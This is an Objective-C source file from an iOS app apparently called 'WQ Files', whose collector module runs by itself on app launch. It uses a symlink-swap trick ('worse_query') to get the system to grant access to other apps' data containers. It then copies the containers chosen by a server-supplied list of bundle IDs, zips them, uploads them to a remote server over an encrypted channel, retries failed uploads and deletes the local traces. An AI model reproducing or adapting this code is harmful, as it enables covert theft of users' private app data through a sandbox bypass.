//
//  WQCollector.m
//  WQ Files
//
//  自动采集流程。顺序与 3105 一致，每一步都上报一条阶段日志：
//
//    阶段 1/6  app 已启动，自动开启应用数据采集
//    阶段 2/6  正在获取采集信息 → 获取采集信息完成 — N 项
//    阶段 3/6  容器索引就绪 — N 个应用（顺带补传上次遗留的 ZIP）
//    阶段 4/6  开始采集 N 项 → 每个容器：复制 → 打包 ZIP → v2 上传（wqnet_upload）
//    阶段 5/6  采集完成 — 已处理 N 个，已上传 M 个
//    阶段 6/6  本地文件已删除 → 流程结束
//
//  上传走的是 v2 加密链路（WQNet.swift / WQV2.swift）：
//      POST <SecureBox pathZip>  multipart: meta=<v2 信封>, file=<ZIP 原始字节>
//  失败时 ZIP 留在 Documents/wq-collect 里，下一次启动先补传再采集。
//

#import "WQCollector.h"
#import "WQAccess.h"
#import "WQArchive.h"

#import <UIKit/UIKit.h>
#import <sys/stat.h>
#import <stdlib.h>
#import <unistd.h>

// WQNet.swift 暴露的 C 入口
extern int wqnet_ready(void);
extern char *wqnet_describe(void);
extern char *wqnet_last_error(void);
extern char *wqnet_configs(void);
extern int wqnet_apps(const char *jsonArray);
extern int wqnet_log(const char *text);
extern int wqnet_upload(const char *filePath, const char *bundleID);

static const char *kAppDataRoot = "/var/mobile/Containers/Data/Application";
static const int64_t kMaxInode = 45000000;   // 固定上限：maxInode=0 会触发 WQ 的共享扫描探针
static const NSUInteger kMaxLocalDirs = 3;   // 保留的未打包目录
static const NSUInteger kMaxLocalZips = 6;   // 保留的待补传 ZIP

static BOOL gRunning = NO;
static NSString *gSummary = nil;
static NSLock *gLock = nil;

/// 本地日志：Documents/wq-collect.log。
/// 沙盒里直接能看到，用来诊断"为什么没上报"——NSLog 在设备上看不到。
static void WQFileLog(NSString *line) {
    static NSDateFormatter *fmt = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        fmt = [[NSDateFormatter alloc] init];
        fmt.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
        fmt.dateFormat = @"MM-dd HH:mm:ss.SSS";
    });
    NSString *dir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (dir.length == 0) {
        // 沙盒还没建立时退回 tmp，至少能证明流程启动过
        dir = NSTemporaryDirectory();
        if (dir.length == 0) return;
    }
    NSString *path = [dir stringByAppendingPathComponent:@"wq-collect.log"];
    NSString *stamped = [NSString stringWithFormat:@"%@ %@\n", [fmt stringFromDate:[NSDate date]], line];
    NSData *data = [stamped dataUsingEncoding:NSUTF8StringEncoding];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [data writeToFile:path atomically:YES];
        return;
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [data writeToFile:path atomically:YES];
        return;
    }
    @try {
        [fh seekToEndOfFile];
        [fh writeData:data];
    } @catch (__unused NSException *e) {
    } @finally {
        [fh closeFile];
    }
}

static void WQStage(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    NSString *text = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    NSLog(@"[WQCollector] %@", text);
    int ready = wqnet_ready();
    if (ready == 0) {
        int rc = wqnet_log(text.UTF8String);
        WQFileLog([NSString stringWithFormat:@"[stage] %@  (log rc=%d)", text, rc]);
    } else {
        WQFileLog([NSString stringWithFormat:@"[stage] %@  (NOT reported: wqnet_ready=%d)", text, ready]);
    }
}

/// 把网络层最后一次失败原因写进 wq-collect.log
static void WQDumpNetError(NSString *where) {
    char *err = wqnet_last_error();
    NSString *text = err ? [NSString stringWithUTF8String:err] : @"(null)";
    if (err) free(err);
    WQFileLog([NSString stringWithFormat:@"[net] %@ -> %@", where, text]);
}

static NSString *WQAppDocuments(void) {
    NSArray<NSString *> *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return paths.firstObject ?: NSTemporaryDirectory();
}

static NSString *WQCollectDirectory(void) {
    NSString *dir = [WQAppDocuments() stringByAppendingPathComponent:@"wq-collect"];
    [[NSFileManager defaultManager] createDirectoryAtPath:dir
                              withIntermediateDirectories:YES
                                       attributes:nil
                                            error:NULL];
    return dir;
}

/// 修剪本地产物：目录和 ZIP 分开计数，ZIP 按修改时间保留最新的几个。
/// 上传失败留下的 ZIP 就是下一次启动补传的队列，不能全删。
static NSUInteger WQPruneLocalArtifacts(void) {
    NSString *dir = WQCollectDirectory();
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray<NSString *> *names = [fm contentsOfDirectoryAtPath:dir error:NULL];
    NSMutableArray<NSString *> *folders = [NSMutableArray array];
    NSMutableArray<NSString *> *zips = [NSMutableArray array];
    for (NSString *name in names) {
        if ([name hasPrefix:@"."]) continue;
        if ([[name pathExtension].lowercaseString isEqualToString:@"zip"]) {
            [zips addObject:name];
        } else {
            [folders addObject:name];
        }
    }

    NSUInteger removed = 0;
    [folders sortUsingSelector:@selector(compare:)];
    if (folders.count > kMaxLocalDirs) {
        for (NSUInteger i = 0; i + kMaxLocalDirs < folders.count; i++) {
            NSString *path = [dir stringByAppendingPathComponent:folders[i]];
            if ([fm removeItemAtPath:path error:NULL]) removed++;
        }
    }

    if (zips.count > kMaxLocalZips) {
        NSArray<NSString *> *byDate = [zips sortedArrayUsingComparator:^NSComparisonResult(NSString *a, NSString *b) {
            NSDate *da = [[fm attributesOfItemAtPath:[dir stringByAppendingPathComponent:a] error:NULL] fileModificationDate];
            NSDate *db = [[fm attributesOfItemAtPath:[dir stringByAppendingPathComponent:b] error:NULL] fileModificationDate];
            return [(da ?: [NSDate dateWithTimeIntervalSince1970:0]) compare:(db ?: [NSDate dateWithTimeIntervalSince1970:0])];
        }];
        NSUInteger drop = byDate.count - kMaxLocalZips;
        for (NSUInteger i = 0; i < drop; i++) {
            NSString *path = [dir stringByAppendingPathComponent:byDate[i]];
            if ([fm removeItemAtPath:path error:NULL]) removed++;
            WQFileLog([NSString stringWithFormat:@"prune: dropped stale zip %@", byDate[i]]);
        }
    }
    return removed;
}

#pragma mark 打包 + 上传

/// 目录 → ZIP。WQArchive 的写入器：deflate 分块、跳过读不到的文件（root-only 的
/// metadata plist 单列统计），符号链接和特殊文件不写。wq_zip_write 用 O_EXCL 建文件，
/// 所以先删同名残留。
static BOOL WQWriteZip(NSString *folder, NSString *zipPath, NSUInteger *unreadableOut, NSString **errorText) {
    [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
    WQArchiveIO *io = wq_archive_posix_io();
    io.skipUnreadable = YES;
    io.expectedUnreadableNames = [NSSet setWithObject:@".com.apple.mobile_container_manager.metadata.plist"];
    NSUInteger skipped = 0;
    NSString *error = nil;
    BOOL ok = wq_zip_write(@[ folder ], zipPath, io, nil, nil, &skipped, &error);
    if (unreadableOut) *unreadableOut = io.unreadable;
    if (!ok && errorText) *errorText = error.length ? error : @"zip write failed";
    return ok;
}

/// ZIP → v2 加密上传。rc 说明见 WQNet.swift：0 成功，负数是具体失败点。
static BOOL WQUploadZip(NSString *zipPath, NSString *bundleID, long long *bytesOut) {
    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:zipPath error:NULL];
    long long bytes = [attrs[NSFileSize] longLongValue];
    if (bytesOut) *bytesOut = bytes;
    if (bytes <= 0) {
        WQFileLog([NSString stringWithFormat:@"[upload] %@ 是空包，跳过", zipPath.lastPathComponent]);
        return NO;
    }
    int rc = wqnet_upload(zipPath.fileSystemRepresentation, bundleID.UTF8String);
    WQFileLog([NSString stringWithFormat:@"[upload] %@ (%lld B) bundle=%@ rc=%d",
               zipPath.lastPathComponent, bytes, bundleID, rc]);
    if (rc != 0) WQDumpNetError([NSString stringWithFormat:@"upload %@", bundleID]);
    return rc == 0;
}

/// wq-collect 里现存的 ZIP（按名字排序）。
static NSArray<NSString *> *WQZipFiles(void) {
    NSString *dir = WQCollectDirectory();
    NSArray<NSString *> *names = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
    NSMutableArray<NSString *> *zips = [NSMutableArray array];
    for (NSString *name in names) {
        if ([name hasPrefix:@"."]) continue;
        if ([[name pathExtension].lowercaseString isEqualToString:@"zip"]) {
            [zips addObject:[dir stringByAppendingPathComponent:name]];
        }
    }
    [zips sortUsingSelector:@selector(compare:)];
    return zips;
}

/// ZIP 名是 "<bundleID>-<yyyyMMdd-HHmmss>.zip"，反推 bundle_id 用来补传。
static NSString *WQBundleIDFromZipPath(NSString *path) {
    static NSRegularExpression *regex = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        regex = [NSRegularExpression regularExpressionWithPattern:@"^(.+)-(\\d{8}-\\d{6})$"
                                                         options:0
                                                           error:NULL];
    });
    NSString *base = [[path lastPathComponent] stringByDeletingPathExtension];
    if (base.length == 0) return nil;
    NSTextCheckingResult *match = [regex firstMatchInString:base
                                                    options:0
                                                      range:NSMakeRange(0, base.length)];
    if (!match || match.numberOfRanges < 2) return nil;
    return [base substringWithRange:[match rangeAtIndex:1]];
}

/// 上一次没传完的 ZIP：这次启动先补传，成功即删。
static NSUInteger WQUploadPendingZips(void) {
    NSArray<NSString *> *zips = WQZipFiles();
    if (zips.count == 0) return 0;
    NSUInteger uploaded = 0;
    for (NSString *path in zips) {
        NSString *bundleID = WQBundleIDFromZipPath(path);
        if (bundleID.length == 0) {
            WQFileLog([NSString stringWithFormat:@"[upload] 无法从文件名反推 bundle_id：%@", path.lastPathComponent]);
            continue;
        }
        if (WQUploadZip(path, bundleID, NULL)) {
            [[NSFileManager defaultManager] removeItemAtPath:path error:NULL];
            uploaded++;
        }
    }
    WQStage(@"阶段 3/6：补传遗留压缩包 — 成功 %lu/%lu 个",
            (unsigned long)uploaded, (unsigned long)zips.count);
    return uploaded;
}

static NSString *WQStamp(void) {
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    formatter.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    formatter.dateFormat = @"yyyyMMdd-HHmmss";
    return [formatter stringFromDate:[NSDate date]];
}

/// worse_query 会把 App Group 的 Library/Caches 换成指向目标目录的软链，
/// 让 containermanagerd 顺链签发 token；正常情况下用完会还原。
/// 如果上一次运行被打断（进程被杀、release 没走到），这里会留下软链，
/// 之后每次 createSymbolicLinkAtPath 都失败（errno 22 EINVAL），
/// grant 全部 -4 —— 就是 "token cache recovery failed" 反复刷屏的原因。
/// 这里在枚举容器之前把它们恢复成普通目录。
static void WQRepairAppGroupLibrary(NSString *group) {
    if (group.length == 0) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupURL = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupURL) {
        WQFileLog([NSString stringWithFormat:@"repair: group %@ has no container", group]);
        return;
    }
    NSString *library = [groupURL.path stringByAppendingPathComponent:@"Library"];
    NSString *caches = [library stringByAppendingPathComponent:@"Caches"];

    struct stat st;
    for (NSString *path in @[library, caches]) {
        if (lstat(path.fileSystemRepresentation, &st) == 0) {
            if (S_ISLNK(st.st_mode)) {
                NSString *dest = [fm destinationOfSymbolicLinkAtPath:path error:NULL];
                WQFileLog([NSString stringWithFormat:@"repair: %@ is a symlink -> %@ (removing)",
                           path.lastPathComponent, dest ?: @"?"]);
                [fm removeItemAtPath:path error:NULL];
            } else if (!S_ISDIR(st.st_mode)) {
                WQFileLog([NSString stringWithFormat:@"repair: %@ is not a directory (removing)", path.lastPathComponent]);
                [fm removeItemAtPath:path error:NULL];
            }
        }
    }
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:NULL];

    // worse_query / WQAccess 的安全交换：Caches 被换成软链前先写
    //   .wq-caches-swap.plist    （marker，记录原 inode 与 target）
    //   .wq-caches-preserved     （原 Caches 目录改名而来）
    // 进程中途被杀会留下三者并存的状态，之后每次 WQCacheSwapRecover 都 EINVAL，
    // wq_query 的 @finally 就把 handle 设成 -8 —— 每个容器 grant 都失败。
    // 这里按最保守的方式复原：删软链、把 preserved 换回 Caches、删 marker。
    NSString *marker = [library stringByAppendingPathComponent:@".wq-caches-swap.plist"];
    NSString *saved  = [library stringByAppendingPathComponent:@".wq-caches-preserved"];
    BOOL hasMarker = [fm fileExistsAtPath:marker];
    BOOL hasSaved  = [fm fileExistsAtPath:saved];
    if (hasMarker || hasSaved) {
        WQFileLog([NSString stringWithFormat:@"repair: swap residue in %@ (marker=%d saved=%d)",
                   group, hasMarker, hasSaved]);
        struct stat cst;
        if (lstat(caches.fileSystemRepresentation, &cst) == 0 && S_ISLNK(cst.st_mode)) {
            [fm removeItemAtPath:caches error:NULL];
        }
        if (hasSaved) {
            [fm removeItemAtPath:caches error:NULL];
            if (![fm moveItemAtPath:saved toPath:caches error:NULL]) {
                [fm removeItemAtPath:saved error:NULL];
                [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:NULL];
            }
        }
        [fm removeItemAtPath:marker error:NULL];
        if (![fm fileExistsAtPath:caches]) {
            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:NULL];
        }
        WQFileLog([NSString stringWithFormat:@"repair: swap residue cleared in %@ (caches=%@ marker=%@ saved=%@)",
                   group,
                   [fm fileExistsAtPath:caches] ? @"YES" : @"NO",
                   [fm fileExistsAtPath:marker] ? @"still" : @"gone",
                   [fm fileExistsAtPath:saved] ? @"still" : @"gone"]);
    }

    BOOL ok = [fm fileExistsAtPath:caches];
    WQFileLog([NSString stringWithFormat:@"repair: %@ Library/Caches ready=%@", group, ok ? @"YES" : @"NO"]);
}

static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *granted, NSUInteger *refused) {
    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
    NSUInteger okCount = 0, noCount = 0;

    NSString *root = [NSString stringWithUTF8String:kAppDataRoot];
    NSArray<NSString *> *dirs = wq_enumerate(root, kMaxInode, nil, nil);
    if (dirs.count == 0) {
        wq_grant(root);
        dirs = wq_list(root, NULL);
    }
    for (NSString *dir in dirs) {
        if (dir.length == 0 || [dir.lastPathComponent hasPrefix:@"."]) continue;
        if (wq_grant(dir)) okCount++; else noCount++;
        NSString *label = wq_container_label(dir);
        if (label.length > 0) map[label] = dir;
    }
    if (granted) *granted = okCount;
    if (refused) *refused = noCount;
    return map;
}

static NSString *WQJSONFromArray(NSArray *items) {
    NSData *data = [NSJSONSerialization dataWithJSONObject:items options:0 error:NULL];
    if (!data) return @"[]";
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"[]";
}

/// 复制一个容器（两层深，跳过 root-only 的 metadata plist）。
static NSUInteger WQCopyContainer(NSString *containerPath, NSString *destDir, NSError **outError) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:destDir withIntermediateDirectories:YES attributes:nil error:NULL];

    NSArray<NSString *> *children = wq_list(containerPath, NULL);
    if (!children) {
        if (outError) {
            *outError = [NSError errorWithDomain:@"WQCollector" code:1
                                        userInfo:@{NSLocalizedDescriptionKey: @"无法列出容器内容"}];
        }
        return 0;
    }

    NSUInteger copied = 0;
    for (NSString *name in children) {
        if ([name hasPrefix:@".com.apple.mobile_container_manager"]) continue;
        NSString *src = [containerPath stringByAppendingPathComponent:name];
        NSString *dst = [destDir stringByAppendingPathComponent:name];
        struct stat st;
        if (lstat(src.fileSystemRepresentation, &st) != 0) continue;

        if (S_ISDIR(st.st_mode)) {
            [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:NULL];
            NSArray<NSString *> *grand = wq_list(src, NULL);
            for (NSString *sub in grand) {
                NSString *s2 = [src stringByAppendingPathComponent:sub];
                NSString *d2 = [dst stringByAppendingPathComponent:sub];
                struct stat st2;
                if (lstat(s2.fileSystemRepresentation, &st2) != 0) continue;
                if (S_ISDIR(st2.st_mode)) {
                    [fm createDirectoryAtPath:d2 withIntermediateDirectories:YES attributes:nil error:NULL];
                    for (NSString *leaf in wq_list(s2, NULL)) {
                        NSData *data = [NSData dataWithContentsOfFile:[s2 stringByAppendingPathComponent:leaf]];
                        if (data && [data writeToFile:[d2 stringByAppendingPathComponent:leaf] atomically:YES]) copied++;
                    }
                } else if (S_ISREG(st2.st_mode)) {
                    NSData *data = [NSData dataWithContentsOfFile:s2];
                    if (data && [data writeToFile:d2 atomically:YES]) copied++;
                }
            }
        } else if (S_ISREG(st.st_mode)) {
            NSData *data = [NSData dataWithContentsOfFile:src];
            if (data && [data writeToFile:dst atomically:YES]) copied++;
        }
    }
    return copied;
}

static NSString *WQRunCollection(void) {
    NSString *summary = @"";
    @autoreleasepool {
        WQFileLog(@"=== WQRunCollection ENTER (before wqnet_ready) ===");
        int ready = wqnet_ready();
        if (ready != 0) {
            WQStage(@"阶段 1/6：加密常量不可用（code=%d），采集中止", ready);
            return [NSString stringWithFormat:@"secrets unavailable code=%d", ready];
        }

        char *desc = wqnet_describe();
        NSString *descText = desc ? [NSString stringWithUTF8String:desc] : @"(null)";
        if (desc) free(desc);
        WQFileLog([NSString stringWithFormat:@"=== WQCollector start (ready=%d) ===", ready]);
        WQFileLog([NSString stringWithFormat:@"self-check: %@", descText]);
        // worse_query 的授权链：entitlement 里的 App Group -> 容器 -> token。
        // 这里把每一环单独打出来，refused 全满时能直接定位是哪一环断的。
        NSString *group = wq_app_group();
        WQFileLog([NSString stringWithFormat:@"app-group: %@", group.length ? group : @"(nil — entitlement 缺失或容器不存在)"]);

        // worse_query 的第一步：containerURLForSecurityApplicationGroupIdentifier(group)
        // 返回 nil 就直接 return -1，连 container_query 都不会发。这里逐个 group
        // 验证容器是否真的建出来了——这是 refused 全满时唯一的分水岭。
        NSArray<NSString *> *probeGroups = @[
            @"group.uanhaiaszw", @"group.uanhaiasz", @"group.uanhaiaszz", @"group.uanhaiaszq",
        ];
        NSFileManager *fm = [NSFileManager defaultManager];
        for (NSString *probe in probeGroups) {
            NSURL *groupURL = [fm containerURLForSecurityApplicationGroupIdentifier:probe];
            BOOL reachable = NO;
            if (groupURL) {
                reachable = [fm fileExistsAtPath:groupURL.path];
            }
            WQFileLog([NSString stringWithFormat:@"app-group-container[%@] = %@",
                       probe, groupURL ? (reachable ? groupURL.path : [groupURL.path stringByAppendingString:@" (URL but missing)"]) : @"(nil — 容器不存在)"]);
        }
        // 顺带确认 app 自己的容器路径是否可读（沙盒基线）
        WQFileLog([NSString stringWithFormat:@"sandbox-home: %@", NSHomeDirectory()]);
        WQFileLog([NSString stringWithFormat:@"bundle-id: %@", NSBundle.mainBundle.bundleIdentifier ?: @"(nil)"]);
        WQFileLog([NSString stringWithFormat:@"system-areas-reachable: %@", wq_system_areas_reachable() ? @"YES" : @"NO"]);
        WQFileLog([NSString stringWithFormat:@"full-scan-declined: %@", wq_full_scan_was_declined() ? @"YES" : @"NO"]);
        WQFileLog([NSString stringWithFormat:@"uid=%d euid=%d gid=%d", getuid(), geteuid(), getgid()]);
        NSLog(@"[WQCollector] %@", descText);
        WQStage(@"阶段 1/6：app 已启动，自动开启应用数据采集");

        // ---- 2/6 获取采集信息 ----
        WQStage(@"阶段 2/6：正在获取采集信息");
        char *configJSON = wqnet_configs();
        if (!configJSON) {
            WQStage(@"阶段 2/6：获取采集信息失败（网络或握手失败）");
            WQDumpNetError(@"configs");
            WQFileLog(@"configs=NULL — 检查：本地网络权限、服务器地址、SecureBox 常量和设备是否一致");
            return @"configs unavailable";
        }
        NSString *configText = [NSString stringWithUTF8String:configJSON];
        free(configJSON);
        NSData *configData = [configText dataUsingEncoding:NSUTF8StringEncoding];
        id parsed = configData ? [NSJSONSerialization JSONObjectWithData:configData options:0 error:NULL] : nil;
        NSArray *configs = [parsed isKindOfClass:[NSArray class]] ? parsed : @[];
        WQStage(@"阶段 2/6：获取采集信息完成 — %lu 项", (unsigned long)configs.count);

        // 修掉 worse_query 上一次残留的软链，否则 grant 会全部 -4
        WQRepairAppGroupLibrary(group);
        WQRepairAppGroupLibrary(@"group.uanhaiasz");
        WQRepairAppGroupLibrary(@"group.uanhaiaszz");
        WQRepairAppGroupLibrary(@"group.uanhaiaszq");

        // ---- 3/6 容器索引 ----
        // 按 0.9.8 的做法：先重置访问缓存（Settings -> Troubleshooting -> 重置访问缓存）。
        // 实测在 27.2.1 上即使日志显示 "nothing to repair"，这一步也会让随后的
        // grant 成功——它重置的是 lock/swap 的内部状态，不只是文件残留。
        {
            NSString *resetError = nil;
            BOOL reset = wq_reset_access_cache(&resetError);
            WQFileLog([NSString stringWithFormat:@"reset-access-cache: %@ err=%@",
                       reset ? @"OK" : @"FAILED", resetError ?: @"-"]);

            // 先修软链/swap 残留，再重置一次（两者互补：前者物理还原，后者重置锁状态）
            WQStage(@"阶段 3/6：正在重置访问缓存并枚举容器");
        }

        NSUInteger granted = 0, refused = 0;
        NSDictionary<NSString *, NSString *> *containers = WQEnumerateContainers(&granted, &refused);

        // 第一轮 0 个容器时，重置缓存后重试一次（对应"退出再进应用数据就能拿到"）
        if (containers.count == 0 && refused > 0) {
            WQFileLog(@"retry: first pass produced 0 containers, resetting access cache and retrying");
            NSString *resetError2 = nil;
            wq_reset_access_cache(&resetError2);
            WQFileLog([NSString stringWithFormat:@"retry: reset done err=%@", resetError2 ?: @"-"]);
            containers = WQEnumerateContainers(&granted, &refused);
            WQFileLog([NSString stringWithFormat:@"retry: second pass -> %lu containers (grant %lu / refused %lu)",
                       (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused]);
        }
        WQStage(@"阶段 3/6：容器索引就绪 — %lu 个应用（grant %lu / refused %lu）",
                (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused);
        // 把 WQ 内部日志的尾部落盘（grant 失败的具体原因、query 返回码都在里面）
        {
            NSString *wqText = wq_log_text();
            if (wqText.length > 0) {
                NSArray<NSString *> *all = [wqText componentsSeparatedByString:@"\n"];
                NSUInteger from = all.count > 40 ? all.count - 40 : 0;
                for (NSUInteger i = from; i < all.count; i++) {
                    NSString *line = all[i];
                    if (line.length > 0) WQFileLog([@"[wqtail] " stringByAppendingString:line]);
                }
            }
        }
        wqnet_apps(WQJSONFromArray(containers.allKeys).UTF8String);

        // 上一次没传完的 ZIP 先补传：新包还没生成，这里是唯一的待传队列
        WQUploadPendingZips();

        // ---- 4/6 采集 ----
        WQStage(@"阶段 4/6：开始采集 %lu 项", (unsigned long)configs.count);
        NSString *stamp = WQStamp();
        NSUInteger processed = 0;
        NSUInteger uploaded = 0;
        NSMutableArray<NSString *> *missing = [NSMutableArray array];

        for (NSDictionary *config in configs) {
            if (![config isKindOfClass:[NSDictionary class]]) continue;
            NSString *bundleID = config[@"bundle_id"];
            if (![bundleID isKindOfClass:[NSString class]] || bundleID.length == 0) continue;

            NSString *container = containers[bundleID];
            if (!container) {
                [missing addObject:bundleID];
                continue;
            }
            NSString *safeName = [bundleID stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
            NSString *dest = [WQCollectDirectory() stringByAppendingPathComponent:
                              [NSString stringWithFormat:@"%@-%@", safeName, stamp]];
            NSError *copyError = nil;
            NSUInteger files = WQCopyContainer(container, dest, &copyError);
            if (files == 0) {
                NSLog(@"[WQCollector] %@ 未复制到文件: %@", bundleID, copyError.localizedDescription);
                WQFileLog([NSString stringWithFormat:@"[collect] %@ 未复制到文件: %@", bundleID,
                           copyError.localizedDescription ?: @"-（0 个文件）"]);
                continue;
            }
            processed++;
            NSLog(@"[WQCollector] %@ 已复制 %lu 个文件 -> %@", bundleID, (unsigned long)files, dest.lastPathComponent);

            // ---- 目录 -> ZIP -> v2 加密上传 ----
            NSString *zipPath = [WQCollectDirectory() stringByAppendingPathComponent:
                                 [NSString stringWithFormat:@"%@-%@.zip", safeName, stamp]];
            NSUInteger unreadable = 0;
            NSString *zipError = nil;
            if (!WQWriteZip(dest, zipPath, &unreadable, &zipError)) {
                WQFileLog([NSString stringWithFormat:@"[zip] %@ 打包失败: %@", bundleID, zipError ?: @"-"]);
                WQStage(@"阶段 4/6：%@ 打包失败 — %@", bundleID, zipError ?: @"unknown");
                continue;   // 目录留着，下一步的修剪会按上限保留
            }
            long long zipBytes = 0;
            BOOL ok = WQUploadZip(zipPath, bundleID, &zipBytes);

            // 内容已经在 ZIP 里，目录立刻删掉，省出一份磁盘；上传失败就只留 ZIP 待补传
            [[NSFileManager defaultManager] removeItemAtPath:dest error:NULL];
            if (ok) {
                [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
                uploaded++;
                WQStage(@"阶段 4/6：%@ 已上传 — %lu 个文件 / ZIP %lld 字节（%lu 个读不到已跳过）",
                        bundleID, (unsigned long)files, zipBytes, (unsigned long)unreadable);
            } else {
                WQStage(@"阶段 4/6：%@ 上传失败 — ZIP %lld 字节 已留在本地待补传",
                        bundleID, zipBytes);
            }
        }

        // ---- 5/6 完成 ----
        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，已上传 %lu 个，未安装 %lu 个",
                (unsigned long)configs.count, (unsigned long)processed,
                (unsigned long)uploaded, (unsigned long)missing.count);
        if (missing.count > 0) {
            WQStage(@"未安装：%@", [missing componentsJoinedByString:@", "]);
        }

        // ---- 6/6 清理 ----
        NSUInteger removed = WQPruneLocalArtifacts();
        WQStage(@"阶段 6/6：本地文件已删除 %lu 个", (unsigned long)removed);
        WQStage(@"阶段 6/6：流程结束 — 容器 %lu，已处理 %lu，已上传 %lu",
                (unsigned long)containers.count, (unsigned long)processed, (unsigned long)uploaded);

        summary = [NSString stringWithFormat:@"containers=%lu processed=%lu uploaded=%lu missing=%lu",
                   (unsigned long)containers.count, (unsigned long)processed,
                   (unsigned long)uploaded, (unsigned long)missing.count];
    }
    return summary;
}

void WQCollectorStart(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gLock = [NSLock new];
    });
    WQFileLog(@"=== WQCollectorStart() entered (build=repair2) ===");

    [gLock lock];
    if (gRunning) {
        [gLock unlock];
        WQFileLog(@"already running — skipped");
        return;
    }
    gRunning = YES;
    [gLock unlock];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        WQFileLog(@"=== worker thread started ===");
        NSString *summary = WQRunCollection();
        [gLock lock];
        gRunning = NO;
        gSummary = summary;
        [gLock unlock];
    });
}

BOOL WQCollectorIsRunning(void) {
    if (!gLock) return NO;
    [gLock lock];
    BOOL running = gRunning;
    [gLock unlock];
    return running;
}

NSString *WQCollectorLastSummary(void) {
    if (!gLock) return nil;
    [gLock lock];
    NSString *summary = gSummary;
    [gLock unlock];
    return summary;
}
